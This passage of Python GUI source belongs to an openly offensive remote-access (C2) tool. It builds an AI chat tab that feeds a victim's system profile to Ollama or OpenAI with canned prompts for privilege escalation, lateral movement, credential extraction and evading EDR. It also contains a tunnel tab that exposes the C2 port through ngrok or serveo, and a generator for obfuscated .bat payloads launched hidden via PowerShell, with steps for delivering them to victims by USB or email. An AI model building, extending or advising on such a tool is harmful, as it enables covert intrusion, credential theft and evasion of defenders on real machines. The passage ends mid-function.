        tk.Label(self._ai_ollama_frame, text="Ollama URL:", bg=C["bg2"],
                 fg=C["text3"], font=FONT_UI_SM).pack(side="left")
        self._ai_ollama_url_var = tk.StringVar(value="http://localhost:11434")
        _entry(self._ai_ollama_frame, self._ai_ollama_url_var, width=28).pack(side="left", padx=6)
        tk.Label(self._ai_ollama_frame, text="Model:", bg=C["bg2"],
                 fg=C["text3"], font=FONT_UI_SM).pack(side="left")
        self._ai_ollama_model_var = tk.StringVar(value="llama3.2")
        _entry(self._ai_ollama_frame, self._ai_ollama_model_var, width=14).pack(side="left", padx=4)

        # ── OpenAI config row (hidden until provider switched) ────────────────
        # Key is stored only in memory — never written to disk
        # Traffic goes from THIS machine to api.openai.com over HTTPS
        self._ai_openai_frame = _frame(top, bg=C["bg2"])
        tk.Label(self._ai_openai_frame, text="OpenAI Key:", bg=C["bg2"],
                 fg=C["text3"], font=FONT_UI_SM).pack(side="left")
        self._ai_openai_key_var = tk.StringVar(value="")
        # show="*" masks the key in the UI so it can't be shoulder-surfed
        _entry(self._ai_openai_frame, self._ai_openai_key_var, width=36, show="*").pack(side="left", padx=6)
        tk.Label(self._ai_openai_frame, text="Model:", bg=C["bg2"],
                 fg=C["text3"], font=FONT_UI_SM).pack(side="left")
        self._ai_openai_model_var = tk.StringVar(value="gpt-4o")
        _entry(self._ai_openai_frame, self._ai_openai_model_var, width=12).pack(side="left", padx=4)

        # ── Context injection + clear history row ─────────────────────────────
        # "Inject Victim Context" pulls data from the selected ClientSession
        # (hostname, OS, IPs, drives, network adapters, local users) and stores
        # it as a string that gets prepended to the AI system prompt.
        # This does NOT send any new commands to the victim — it only reads
        # info that was already received during the initial /r registration.
        ctx_row = _frame(top, bg=C["bg2"])
        ctx_row.pack(anchor="w", pady=4, fill="x")
        _btn(ctx_row, "\U0001f4e5 Inject Victim Context", self._ai_inject_context,
             fg=C["accent"]).pack(side="left")
        # Status label updates to show which victim's context is loaded
        self._ai_ctx_lbl = tk.Label(ctx_row, text="No context injected", bg=C["bg2"],
                                    fg=C["text2"], font=FONT_UI_SM)
        self._ai_ctx_lbl.pack(side="left", padx=8)
        # Clear History wipes both the visible chat and the internal message list
        _btn(ctx_row, "Clear History", self._ai_clear_history,
             fg=C["text2"]).pack(side="right")

        # ── Quick Action buttons ───────────────────────────────────────────────
        # Each button fires a pre-written prompt into _ai_send().
        # No victim interaction — they only talk to the AI provider.
        qa_frame = _frame(p, bg=C["bg2"])
        qa_frame.pack(fill="x", padx=12, pady=(0, 4))
        tk.Label(qa_frame, text="Quick Actions:", bg=C["bg2"], fg=C["text2"],
                 font=FONT_UI_SM).pack(anchor="w")

        # Row 1 — general analysis actions
        qa_row1 = _frame(qa_frame, bg=C["bg2"])
        qa_row1.pack(anchor="w", pady=2)
        quick = [
            ("Suggest Next Steps",          self._ai_suggest_next_steps,     C["accent"]),
            ("Analyze Last Output",         self._ai_analyze_last_output,    C["accent2"]),
            ("MITRE ATT&CK Map",            self._ai_mitre_map,              C["warning"]),
            ("Generate Report",             self._ai_generate_report,        C["success"]),
        ]
        for txt, cmd, fg in quick:
            _btn(qa_row1, txt, cmd, fg=fg).pack(side="left", padx=3)

        # Row 2 — offensive technique suggestions
        qa_row2 = _frame(qa_frame, bg=C["bg2"])
        qa_row2.pack(anchor="w", pady=2)
        quick2 = [
            ("Privilege Escalation Paths",  self._ai_privesc,                C["error"]),
            ("Lateral Movement",            self._ai_lateral_movement,       C["accent"]),
            ("Credential Exploitation",     self._ai_cred_exploit,           C["accent2"]),
            ("Detection Risk Assessment",   self._ai_detection_risk,         C["warning"]),
        ]
        for txt, cmd, fg in quick2:
            _btn(qa_row2, txt, cmd, fg=fg).pack(side="left", padx=3)

        # ── Chat display (read-only scrolled text widget) ─────────────────────
        body = _frame(p, bg=C["bg2"])
        body.pack(fill="both", expand=True, padx=12, pady=(0, 8))

        self._ai_chat = scrolledtext.ScrolledText(
            body, bg=C["term_bg"], fg=C["text3"],
            insertbackground=C["text"], font=FONT_MONO_SM,
            relief="flat", wrap="word", state="disabled",
            selectbackground=C["sel"],
        )
        self._ai_chat.pack(fill="both", expand=True)
        # Colour tags: user messages = blue, AI replies = green,
        # system notices = yellow, errors = red
        self._ai_chat.tag_configure("user_tag",    foreground=C["accent"])
        self._ai_chat.tag_configure("ai_tag",      foreground=C["success"])
        self._ai_chat.tag_configure("system_tag",  foreground=C["warning"])
        self._ai_chat.tag_configure("error_tag",   foreground=C["error"])

        # ── Free-text input row ───────────────────────────────────────────────
        inp_row = _frame(p, bg=C["bg2"])
        inp_row.pack(fill="x", padx=12, pady=(0, 10))
        self._ai_input_var = tk.StringVar()
        ai_entry = _entry(inp_row, self._ai_input_var)
        ai_entry.pack(side="left", fill="x", expand=True, padx=(0, 6))
        # Enter key submits the message (same as clicking Send)
        ai_entry.bind("<Return>", lambda e: self._ai_send())
        _btn(inp_row, "Send", self._ai_send, fg=C["success"]).pack(side="left")

    def _ai_on_provider_change(self, *_):
        """Show the correct config row when the provider dropdown changes."""
        if self._ai_provider_var.get() == "Ollama (local)":
            # Show Ollama URL/model fields, hide OpenAI key field
            self._ai_ollama_frame.pack(anchor="w", pady=2, fill="x")
            self._ai_openai_frame.pack_forget()
        else:
            # Show OpenAI key/model fields, hide Ollama fields
            self._ai_ollama_frame.pack_forget()
            self._ai_openai_frame.pack(anchor="w", pady=2, fill="x")

    def _ai_chat_append(self, text, tag=None):
        """Append text to the chat widget (thread-safe via gui_queue callers).

        The widget is kept disabled to prevent accidental editing.
        We temporarily enable it, insert the text with an optional colour tag,
        scroll to the bottom, then disable it again.
        """
        self._ai_chat.configure(state="normal")
        if tag:
            self._ai_chat.insert("end", text, tag)
        else:
            self._ai_chat.insert("end", text)
        self._ai_chat.see("end")   # auto-scroll to latest message
        self._ai_chat.configure(state="disabled")

    def _ai_inject_context(self):
        """Pull victim info from the selected ClientSession into the AI system prompt.

        Reads data that was already received at /r registration time — does NOT
        send any new command to the victim.  The assembled string is stored in
        self._ai_context and prepended to every subsequent AI system prompt so
        the model has full situational awareness about the target machine.
        """
        client = self._selected_client
        if not client:
            messagebox.showinfo("No client", "Select a client first.")
            return
        info = client.info

        # Build a human-readable summary of the victim's system profile
        lines = [
            f"Hostname   : {info.get('hostname', '?')}",
            f"Username   : {info.get('username', '?')}",
            f"Domain     : {info.get('domain', '?')}",
            f"OS         : {info.get('os_release', info.get('os', '?'))} {info.get('os_version', '')}",
            f"Arch       : {info.get('architecture', '?')}",
            f"CPU        : {info.get('cpu_model', '?')}",
            f"RAM (GB)   : {info.get('ram_gb', '?')}",
            f"Local IP   : {info.get('local_ip', '?')}",
            f"Public IP  : {info.get('public_ip', '?')}",
            f"Is Admin   : {info.get('is_admin', False)}",
            f"Uptime     : {info.get('uptime', '?')}",
        ]

        # Append drive listing if available
        drives = info.get("drives", [])
        if drives:
            lines.append("Drives:")
            for d in drives:
                lines.append(f"  {d.get('drive','')} {d.get('label','')} "
                             f"{d.get('free_gb',0)}/{d.get('total_gb',0)} GB free ({d.get('fs','')})")

        # Append network adapter listing if available
        nets = info.get("network_adapters", [])
        if nets:
            lines.append("Network Adapters:")
            for n in nets:
                lines.append(f"  {n.get('name','')} IP={n.get('ip','')} MAC={n.get('mac','')} GW={n.get('gateway','')}")

        # Append local user accounts if available
        users = info.get("users", [])
        if users:
            lines.append("Local Users:")
            for u in users:
                lines.append(f"  {u.get('name','')} enabled={u.get('enabled','')} last={u.get('last_login','')}")

        # Store assembled context — it is injected into every AI call from now on
        self._ai_context = "\n".join(lines)
        self._ai_ctx_lbl.configure(
            text=f"Context: {info.get('hostname','?')} / {info.get('username','?')}",
            fg=C["success"])
        self._ai_chat_append(
            f"[System] Victim context injected: {info.get('hostname','?')}\n", "system_tag")

    def _ai_clear_history(self):
        """Reset conversation state: empty history list, clear chat widget, clear context."""
        self._ai_history = []
        self._ai_chat.configure(state="normal")
        self._ai_chat.delete("1.0", "end")
        self._ai_chat.configure(state="disabled")
        self._ai_ctx_lbl.configure(text="No context injected", fg=C["text2"])
        self._ai_context = ""

    def _ai_send(self, prompt=None):
        """Submit a prompt to the AI provider.

        Called either by the Send button / Enter key (reads the input field)
        or directly by a Quick Action button (prompt passed as argument).
        Spawns a daemon thread so the GUI never blocks while waiting for the
        AI response — which can take several seconds on local models.
        """
        if prompt is None:
            prompt = self._ai_input_var.get().strip()
        if not prompt:
            return
        self._ai_input_var.set("")   # clear the input box immediately
        self._ai_chat_append(f"\n[You] {prompt}\n", "user_tag")
        # Run the blocking API call in a background thread
        threading.Thread(target=self._ai_call_api, args=(prompt,), daemon=True).start()

    def _ai_call_api(self, prompt):
        """Background thread: build messages, call the selected provider, push result to queue.

        Runs in a daemon thread (never blocks the GUI).  All GUI updates are
        done via gui_queue so they execute on the main thread in _process_queue.

        History management:
          - Append the new user turn before the call
          - Cap to 40 messages (20 turns) to stay within context limits
          - Append the assistant reply after a successful call
          - On error, push an ai_error event instead
        """
        # Build the system prompt — include victim context if injected
        system_prompt = (
            "You are an expert red-team analyst assisting with a controlled cybersecurity "
            "lab environment. Provide concise, actionable tactical advice."
        )
        if self._ai_context:
            system_prompt += f"\n\nVictim context:\n{self._ai_context}"

        # Add user turn to rolling history before sending
        self._ai_history.append({"role": "user", "content": prompt})
        if len(self._ai_history) > 40:
            self._ai_history = self._ai_history[-40:]   # drop oldest turns

        provider = self._ai_provider_var.get()
        try:
            if provider == "Ollama (local)":
                reply = self._ai_call_ollama(system_prompt)
            else:
                reply = self._ai_call_openai(system_prompt)

            # Store assistant reply in history for future context
            self._ai_history.append({"role": "assistant", "content": reply})
            if len(self._ai_history) > 40:
                self._ai_history = self._ai_history[-40:]

            # Send reply to GUI thread via queue
            self.gui_queue.put(("ai_response", reply))
        except Exception as exc:
            # Surface any connection / auth / parse error in the chat
            self.gui_queue.put(("ai_error", str(exc)))

    def _ai_call_ollama(self, system_prompt):
        """POST to the local Ollama /api/chat endpoint and return the reply text.

        Traffic stays on loopback (localhost) — nothing leaves the machine.
        Timeout is 120 s to accommodate slow local models on CPU.
        stream=False means Ollama returns the full response in one JSON body.
        """
        url   = self._ai_ollama_url_var.get().rstrip("/") + "/api/chat"
        model = self._ai_ollama_model_var.get().strip() or "llama3.2"
        # Prepend the system prompt to the full conversation history
        messages = [{"role": "system", "content": system_prompt}] + self._ai_history
        body  = json.dumps({
            "model": model, "messages": messages, "stream": False
        }).encode("utf-8")
        req = urllib.request.Request(
            url, data=body, method="POST",
            headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=120) as resp:
            data = json.loads(resp.read())
        return data["message"]["content"]

    def _ai_call_openai(self, system_prompt):
        """POST to the OpenAI chat completions API and return the reply text.

        Traffic: THIS machine  →  api.openai.com:443 (HTTPS).
        The victim machine is completely uninvolved.
        Key is read from the UI field each call — never cached or logged.
        """
        key   = self._ai_openai_key_var.get().strip()
        model = self._ai_openai_model_var.get().strip() or "gpt-4o"
        if not key:
            raise ValueError("OpenAI API key is not set.")
        # Prepend system prompt to conversation history
        messages = [{"role": "system", "content": system_prompt}] + self._ai_history
        body  = json.dumps({
            "model": model, "messages": messages
        }).encode("utf-8")
        req = urllib.request.Request(
            "https://api.openai.com/v1/chat/completions",
            data=body, method="POST",
            headers={
                "Content-Type":  "application/json",
                "Authorization": f"Bearer {key}",   # standard Bearer token auth
            })
        with urllib.request.urlopen(req, timeout=120) as resp:
            data = json.loads(resp.read())
        return data["choices"][0]["message"]["content"]

    # ── Quick Action prompt methods ────────────────────────────────────────────
    # Each method calls _ai_send() with a pre-written tactical prompt.
    # They do NOT interact with the victim — they only talk to the AI provider.

    def _ai_suggest_next_steps(self):
        """Ask the AI what the highest-value post-exploitation actions are right now."""
        self._ai_send(
            "Based on the current victim context and session, suggest the best next steps "
            "for post-exploitation. Be specific and prioritize high-value actions.")

    def _ai_analyze_last_output(self):
        """Ask the AI to interpret and summarize the most recent command output in chat history."""
        if not self._ai_history:
            messagebox.showinfo("No history", "No output in AI history to analyze.")
            return
        self._ai_send(
            "Analyze the last command output in our conversation and summarize key findings, "
            "vulnerabilities, and opportunities.")

    def _ai_mitre_map(self):
        """Map current access and available techniques to MITRE ATT&CK IDs."""
        self._ai_send(
            "Based on the victim context, map the current access and possible actions to "
            "MITRE ATT&CK techniques and tactics (use technique IDs where applicable).")

    def _ai_generate_report(self):
        """Generate a structured pentest report section for this victim."""
        self._ai_send(
            "Generate a concise penetration test report section based on what we know about "
            "this victim: findings, evidence, impact, and remediation recommendations.")

    def _ai_privesc(self):
        """List specific privilege escalation paths available on the victim."""
        self._ai_send(
            "List specific privilege escalation paths available on this victim system "
            "given the current user and OS. Include commands to check and exploit each path.")

    def _ai_lateral_movement(self):
        """Suggest lateral movement techniques from this victim to neighbouring hosts."""
        self._ai_send(
            "Suggest lateral movement techniques applicable from this victim to other hosts "
            "on its network. Include specific tools, commands, and what to look for.")

    def _ai_cred_exploit(self):
        """Identify credential harvesting opportunities on the victim."""
        self._ai_send(
            "Identify credential exploitation opportunities on this victim: cached credentials, "
            "browser passwords, credential stores, and how to extract them.")

    def _ai_detection_risk(self):
        """Assess how likely current actions are to trigger EDR/AV/logging on the victim."""
        self._ai_send(
            "Assess the detection risk of current actions on this victim. What logging, "
            "EDR, or monitoring might flag our activity, and how can we reduce visibility?")

    def _build_tunnel_tab(self):
        p = self._tab_tunnel
        toolbar = _frame(p, bg=C["bg3"])
        toolbar.pack(fill="x")
        tk.Label(toolbar, text="Global Tunnel  (ngrok / SSH)", bg=C["bg3"],
                 fg=C["accent"], font=FONT_UI_B, padx=10, pady=8).pack(side="left")
        body = _frame(p, bg=C["bg2"])
        body.pack(fill="both", expand=True, padx=20, pady=14)
        tk.Label(
            body,
            text="Expose your local C2 port to the internet so any machine on the\n"
                 "globe can connect back.  Start the server first, then start a tunnel.",
            bg=C["bg2"], fg=C["text2"], font=FONT_UI_SM, justify="left",
        ).pack(anchor="w", pady=(0, 14))
        cols = _frame(body, bg=C["bg2"])
        cols.pack(fill="x")
        left  = _frame(cols, bg=C["bg3"])
        left.pack(side="left", fill="both", expand=True, padx=(0, 8), ipadx=10, ipady=10)
        right = _frame(cols, bg=C["bg3"])
        right.pack(side="left", fill="both", expand=True, ipadx=10, ipady=10)

        def _sl(parent, txt):
            tk.Label(parent, text=txt, bg=C["bg3"], fg=C["accent"],
                     font=FONT_UI_B, padx=4, pady=4).pack(anchor="w")

        _sl(left, "ngrok  (TCP tunnel)")
        tk.Label(left,
                 text="Download ngrok.exe from ngrok.com/download\n"
                      "Optionally add an authtoken (free account).",
                 bg=C["bg3"], fg=C["text2"], font=FONT_UI_SM,
                 justify="left").pack(anchor="w", padx=4)
        row = _frame(left, bg=C["bg3"])
        row.pack(fill="x", padx=4, pady=4)
        tk.Label(row, text="ngrok.exe path:", bg=C["bg3"],
                 fg=C["text3"], font=FONT_UI_SM).pack(side="left")
        self._ngrok_path_var = tk.StringVar(
            value=shutil.which("ngrok") or "ngrok.exe")
        _entry(row, self._ngrok_path_var, width=20).pack(side="left", padx=4)
        _btn(row, "...",
             lambda: self._ngrok_path_var.set(
                 filedialog.askopenfilename(
                     title="Find ngrok.exe",
                     filetypes=[("exe", "*.exe"), ("All", "*.*")])),
             fg=C["text2"]).pack(side="left")
        row2 = _frame(left, bg=C["bg3"])
        row2.pack(fill="x", padx=4, pady=2)
        tk.Label(row2, text="Port:", bg=C["bg3"],
                 fg=C["text3"], font=FONT_UI_SM).pack(side="left")
        self._ngrok_port_var = tk.StringVar(value=str(DEFAULT_PORT))
        _entry(row2, self._ngrok_port_var, width=8).pack(side="left", padx=4)
        ng_btns = _frame(left, bg=C["bg3"])
        ng_btns.pack(fill="x", padx=4, pady=4)
        _btn(ng_btns, "Start ngrok", self._tunnel_start_ngrok,
             fg=C["success"]).pack(side="left")
        _btn(ng_btns, "Stop", self._tunnel_stop,
             fg=C["error"]).pack(side="left", padx=6)
        self._ngrok_status_var = tk.StringVar(value="\u25cf Not running")
        self._ngrok_status_lbl = tk.Label(left, textvariable=self._ngrok_status_var,
                 bg=C["bg3"], fg=C["error"], font=("Segoe UI", 8, "bold"), padx=4)
        self._ngrok_status_lbl.pack(anchor="w", pady=2)
        self._ngrok_addr_var = tk.StringVar(value="")
        addr_row = _frame(left, bg=C["bg3"])
        addr_row.pack(fill="x", padx=4, pady=2)
        tk.Label(addr_row, text="Public:", bg=C["bg3"],
                 fg=C["text2"], font=FONT_UI_SM).pack(side="left")
        tk.Label(addr_row, textvariable=self._ngrok_addr_var, bg=C["bg3"],
                 fg=C["success"], font=("Segoe UI", 9, "bold")).pack(side="left", padx=4)
        ng_apply_row = _frame(left, bg=C["bg3"])
        ng_apply_row.pack(anchor="w", padx=4, pady=6)
        _btn(ng_apply_row, "Apply to Payload", self._tunnel_apply_to_payload,
             fg=C["accent"]).pack(side="left")
        _btn(ng_apply_row, "Apply & Start Server", self._tunnel_apply_all,
             fg=C["success"]).pack(side="left", padx=(6, 0))

        _sl(right, "SSH Tunnel  (no install needed)")
        tk.Label(right,
                 text="Uses OpenSSH built into Windows 10+.\n"
                      "serveo.net provides free TCP forwarding.",
                 bg=C["bg3"], fg=C["text2"], font=FONT_UI_SM,
                 justify="left").pack(anchor="w", padx=4)
        row3 = _frame(right, bg=C["bg3"])
        row3.pack(fill="x", padx=4, pady=4)
        tk.Label(row3, text="Service:", bg=C["bg3"],
                 fg=C["text3"], font=FONT_UI_SM).pack(side="left")
        self._ssh_svc_var = tk.StringVar(value="serveo.net")
        svc_cb = ttk.Combobox(row3, textvariable=self._ssh_svc_var, width=14,
                              values=["serveo.net"], state="readonly")
        svc_cb.pack(side="left", padx=4)
        row4 = _frame(right, bg=C["bg3"])
        row4.pack(fill="x", padx=4, pady=2)
        tk.Label(row4, text="Port:", bg=C["bg3"],
                 fg=C["text3"], font=FONT_UI_SM).pack(side="left")
        self._ssh_port_var = tk.StringVar(value=str(DEFAULT_PORT))
        _entry(row4, self._ssh_port_var, width=8).pack(side="left", padx=4)
        ssh_btns = _frame(right, bg=C["bg3"])
        ssh_btns.pack(fill="x", padx=4, pady=4)
        _btn(ssh_btns, "Start SSH Tunnel", self._tunnel_start_ssh,
             fg=C["success"]).pack(side="left")
        _btn(ssh_btns, "Stop", self._tunnel_stop,
             fg=C["error"]).pack(side="left", padx=6)
        self._ssh_status_var = tk.StringVar(value="\u25cf Not running")
        self._ssh_status_lbl = tk.Label(right, textvariable=self._ssh_status_var,
                 bg=C["bg3"], fg=C["error"], font=("Segoe UI", 8, "bold"), padx=4)
        self._ssh_status_lbl.pack(anchor="w", pady=2)
        self._ssh_addr_var = tk.StringVar(value="")
        addr_row2 = _frame(right, bg=C["bg3"])
        addr_row2.pack(fill="x", padx=4, pady=2)
        tk.Label(addr_row2, text="Public:", bg=C["bg3"],
                 fg=C["text2"], font=FONT_UI_SM).pack(side="left")
        tk.Label(addr_row2, textvariable=self._ssh_addr_var, bg=C["bg3"],
                 fg=C["success"], font=("Segoe UI", 9, "bold")).pack(side="left", padx=4)
        ssh_apply_row = _frame(right, bg=C["bg3"])
        ssh_apply_row.pack(anchor="w", padx=4, pady=6)
        _btn(ssh_apply_row, "Apply to Payload", self._tunnel_apply_to_payload,
             fg=C["accent"]).pack(side="left")
        _btn(ssh_apply_row, "Apply & Start Server", self._tunnel_apply_all,
             fg=C["success"]).pack(side="left", padx=(6, 0))

        _sep(body).pack(fill="x", pady=12)
        tk.Label(
            body,
            text="HOW IT WORKS:\n"
                 "1.  Click Start Server in the header (local port 4444 by default)\n"
                 "2.  Start a tunnel above -- wait for the Public address to appear\n"
                 "3.  Click Apply & Start Server -- one click sets everything up:\n"
                 "      applies tunnel address to Payload, starts/restarts the server\n"
                 "4.  Generate payload.bat in the Payload tab and send it to the victim\n"
                 "5.  The victim connects back through the tunnel to this machine\n\n"
                 "NOTE:  The C2 Auth Token field (top right) is an OPTIONAL secret\n"
                 "that clients must present to connect.  Leave blank for open access.\n"
                 "It is NOT the ngrok authtoken -- configure that via:\n"
                 "  ngrok config add-authtoken <your_token>",
            bg=C["bg2"], fg=C["text2"], font=FONT_MONO_SM, justify="left",
        ).pack(anchor="w")

    def _tunnel_start_ngrok(self):
        exe  = self._ngrok_path_var.get().strip()
        port = self._ngrok_port_var.get().strip()
        if not exe or not port.isdigit():
            messagebox.showwarning("Invalid", "Set ngrok path and port.")
            return
        self._ngrok_status_var.set("\u25cf Connecting...")
        self._ngrok_status_lbl.configure(fg=C["warning"])
        self._set_status("Starting ngrok tunnel...")

        def on_ready(addr, err):
            if addr:
                self.gui_queue.put(("tunnel_up", "ngrok", addr))
            else:
                self.gui_queue.put(("tunnel_err", "ngrok", err or "Unknown error"))

        self._tunnel.start_ngrok(exe, int(port), on_ready)

    def _tunnel_start_ssh(self):
        svc  = self._ssh_svc_var.get().strip()
        port = self._ssh_port_var.get().strip()
        if not svc or not port.isdigit():
            messagebox.showwarning("Invalid", "Set service and port.")
            return
        self._ssh_status_var.set("\u25cf Connecting...")
        self._ssh_status_lbl.configure(fg=C["warning"])
        self._set_status(f"Starting SSH tunnel to {svc}...")

        def on_ready(addr, err):
            if addr:
                self.gui_queue.put(("tunnel_up", "ssh", addr))
            else:
                self.gui_queue.put(("tunnel_err", "ssh", err or "Unknown error"))

        self._tunnel.start_ssh(svc, int(port), on_ready)

    def _tunnel_stop(self):
        self._tunnel.stop()
        self._ngrok_status_var.set("\u25cf Not running")
        self._ngrok_status_lbl.configure(fg=C["error"])
        self._ngrok_addr_var.set("")
        self._ssh_status_var.set("\u25cf Not running")
        self._ssh_status_lbl.configure(fg=C["error"])
        self._ssh_addr_var.set("")
        self._set_status("Tunnel stopped")

    def _tunnel_apply_to_payload(self):
        addr = self._tunnel.public_addr
        if not addr:
            messagebox.showinfo("No tunnel", "Start a tunnel first.")
            return
        if addr.startswith("http://") or addr.startswith("https://"):
            host = addr.rstrip("/")
            port = str(DEFAULT_PORT)
        elif ":" in addr:
            host, port = addr.rsplit(":", 1)
        else:
            host, port = addr, str(DEFAULT_PORT)
        self._payload_host.set(host)
        self._payload_port.set(port)
        self._notebook.select(self._tab_payload)
        self._set_status(f"Payload updated -> {host}")

    def _tunnel_apply_all(self):
        """Apply tunnel address to payload AND ensure the server is running.

        When using ngrok/SSH tunnels the server always listens on the LOCAL
        port (e.g. 4444).  ngrok forwards external traffic to that local port.
        This button:
          1. Reads the public tunnel address  ->  fills Payload host / port.
          2. Reads the local port from the ngrok/SSH port field in the UI
             and puts it in the server Host/Port fields (0.0.0.0 : local_port).
          3. Stops then restarts the server so the configuration takes effect.
          4. Switches focus to the Payload tab ready for generation.
        """
        addr = self._tunnel.public_addr
        if not addr:
            messagebox.showinfo("No tunnel", "Start a tunnel first, then click this button.")
            return

        if addr.startswith("http://") or addr.startswith("https://"):
            pub_host = addr.rstrip("/")
            pub_port = str(DEFAULT_PORT)
        elif ":" in addr:
            pub_host, pub_port = addr.rsplit(":", 1)
        else:
            pub_host, pub_port = addr, str(DEFAULT_PORT)

        local_port = (self._ngrok_port_var.get().strip()
                      if self._tunnel._mode == "ngrok"
                      else self._ssh_port_var.get().strip())
        if not local_port.isdigit():
            local_port = str(DEFAULT_PORT)

        self._payload_host.set(pub_host)
        self._payload_port.set(pub_port)

        self._var_host.set("0.0.0.0")
        self._var_port.set(local_port)

        if self._server_running:
            self._stop_server()
        self._start_server()

        self._notebook.select(self._tab_payload)
        self._set_status(
            f"Server restarted on 0.0.0.0:{local_port}  |  "
            f"Payload -> {pub_host}:{pub_port}"
        )

    def _build_payload_tab(self):
        p = self._tab_payload
        toolbar = _frame(p, bg=C["bg3"])
        toolbar.pack(fill="x")
        tk.Label(toolbar, text="BAT Payload Generator  +  Obfuscator", bg=C["bg3"],
                 fg=C["accent"], font=FONT_UI_B, padx=10, pady=8).pack(side="left")

        outer = _frame(p, bg=C["bg2"])
        outer.pack(fill="both", expand=True)

        left_col = _frame(outer, bg=C["bg2"])
        left_col.pack(side="left", fill="y", padx=(20, 10), pady=16)

        right_col = _frame(outer, bg=C["bg2"])
        right_col.pack(side="left", fill="both", expand=True, padx=(0, 20), pady=16)

        tk.Label(left_col,
                 text="Generates a .bat payload that runs silently via PowerShell.\n"
                      "No Python required on the victim.  Uses certutil to decode\n"
                      "the embedded PS script.  Launches hidden via VBScript.",
                 bg=C["bg2"], fg=C["text2"], font=FONT_UI_SM,
                 justify="left").pack(anchor="w", pady=(0, 10))

        row = _frame(left_col, bg=C["bg2"])
        row.pack(anchor="w", pady=3)
        tk.Label(row, text="C2 Host / IP:", bg=C["bg2"], fg=C["text3"],
                 font=FONT_UI_SM, width=16, anchor="w").pack(side="left")
        self._payload_host = tk.StringVar(value="127.0.0.1")
        _entry(row, self._payload_host, width=22).pack(side="left", padx=6)

        row2 = _frame(left_col, bg=C["bg2"])
        row2.pack(anchor="w", pady=3)
        tk.Label(row2, text="C2 Port:", bg=C["bg2"], fg=C["text3"],
                 font=FONT_UI_SM, width=16, anchor="w").pack(side="left")
        self._payload_port = tk.StringVar(value=str(DEFAULT_PORT))
        _entry(row2, self._payload_port, width=8).pack(side="left", padx=6)

        _sep(left_col).pack(fill="x", pady=10)

        _btn(left_col, "\u26a1  Generate & Save  payload.bat",
             self._payload_generate, fg=C["success"]).pack(anchor="w", pady=2)

        _sep(left_col).pack(fill="x", pady=10)

        tk.Label(left_col, text="OBFUSCATOR  (Enhanced v3.1  by AmericanDream)",
                 bg=C["bg2"], fg=C["accent2"],
                 font=("Segoe UI", 9, "bold")).pack(anchor="w", pady=(0, 6))

        tk.Label(left_col,
                 text="Generate & obfuscate in one click, or run the\n"
                      "standalone CLI obfuscator for full control.",
                 bg=C["bg2"], fg=C["text2"], font=FONT_UI_SM,
                 justify="left").pack(anchor="w", pady=(0, 6))

        caret_row = _frame(left_col, bg=C["bg2"])
        caret_row.pack(anchor="w", pady=2)
        self._obf_caret_var = tk.BooleanVar(value=False)
        tk.Checkbutton(
            caret_row, text="Add random ^ carets", variable=self._obf_caret_var,
            bg=C["bg2"], fg=C["text3"], selectcolor=C["entry"],
            activebackground=C["bg2"], activeforeground=C["text"],
            font=FONT_UI_SM, command=self._obf_toggle_caret,
        ).pack(side="left")

        caret_cnt_row = _frame(left_col, bg=C["bg2"])
        caret_cnt_row.pack(anchor="w", pady=2)
        tk.Label(caret_cnt_row, text="  Caret count:", bg=C["bg2"],
                 fg=C["text2"], font=FONT_UI_SM).pack(side="left")
        self._obf_caret_count_var = tk.StringVar(value="50")
        self._obf_caret_entry = _entry(caret_cnt_row, self._obf_caret_count_var,
                                       width=6, state="disabled",
                                       disabledbackground=C["bg3"],
                                       disabledforeground=C["text2"])
        self._obf_caret_entry.pack(side="left", padx=4)

        _btn(left_col,
             "\U0001f6e1  Generate & Obfuscate  payload.bat",
             self._payload_generate_and_obfuscate,
             fg=C["accent2"]).pack(anchor="w", pady=(6, 2))

        _btn(left_col,
             "\U0001f5a5  Open Standalone Obfuscator (CLI)",
             self._payload_launch_obfuscator,
             fg=C["text3"]).pack(anchor="w", pady=2)

        _sep(left_col).pack(fill="x", pady=10)

        tk.Label(left_col,
                 text="HOW TO USE:\n\n"
                      "1.  Start the C2 server (header)\n"
                      "2.  Click Generate & Save  or  Generate & Obfuscate\n"
                      "3.  Copy payload.bat to victim (USB, share, email, etc.)\n"
                      "4.  On the victim: double-click payload.bat (silent)\n"
                      "5.  Victim appears in CLIENTS after a few seconds\n"
                      "6.  Auto-reconnects every 5 s\n\n"
                      "Requirements: Windows 10+  |  PowerShell 5+",
                 bg=C["bg2"], fg=C["text2"], font=FONT_UI_SM,
                 justify="left").pack(anchor="w")

        tk.Label(right_col, text="OUTPUT LOG", bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 8, "bold")).pack(anchor="w", pady=(0, 4))
        self._payload_info = scrolledtext.ScrolledText(
            right_col, bg=C["term_bg"], fg=C["text3"],
            insertbackground=C["text"], font=FONT_MONO_SM,
            relief="flat", wrap="word", state="normal",
            selectbackground=C["sel"],
        )
        info = (
            "Waiting for action...\n\n"
            "Generate & Save             — plain .bat (no obfuscation)\n"
            "Generate & Obfuscate        — full v3.1 obfuscation pipeline\n"
            "Open Standalone Obfuscator  — full CLI experience with progress bar\n\n"
            "Obfuscation layers applied:\n"
            "  1. UTF-16 LE BOM prepend (&cls clears terminal)\n"
            "  2. Per-run randomised 26-char substitution alphabet\n"
            "  3. Three-part master key from env-vars (PUBLIC/COMSPEC/ALLUSERS)\n"
            "  4. FOR /L CALL-trick shorthand derivation (%_N%)\n"
            "  5. Alternate env-var sources with random selection\n"
            "  6. Dynamic header generation with random carets\n"
            "  7. REM noise injection (pre-substitution)\n"
            "  8. Junk variable injection (two groups)\n"
            "  9. Optional: random ^ caret injection\n"
        )
        self._payload_info.insert("end", info)
        self._payload_info.configure(state="disabled")
        self._payload_info.pack(fill="both", expand=True)

    def _payload_log(self, text):
        self._payload_info.configure(state="normal")
        self._payload_info.delete("1.0", "end")
        self._payload_info.insert("end", text)
        self._payload_info.configure(state="disabled")

    def _payload_generate(self):
        host = self._payload_host.get().strip()
        port = self._payload_port.get().strip()
        if not host or not port.isdigit():
            messagebox.showwarning("Invalid input", "Enter a valid host and port.")
            return
        token = self._var_token.get().strip()
        bat = _generate_bat(host, int(port), token=token)
        save_path = filedialog.asksaveasfilename(
            defaultextension=".bat",
            filetypes=[("Batch file", "*.bat"), ("All files", "*.*")],
            initialfile="payload.bat",
            title="Save payload",
        )
        if not save_path:
            return
        with open(save_path, "w", newline="") as fh:
            fh.write(bat)
        size_kb = os.path.getsize(save_path) / 1024
        self._payload_log(
            f"[Generate & Save]\n\n"
            f"Saved    : {save_path}\n"
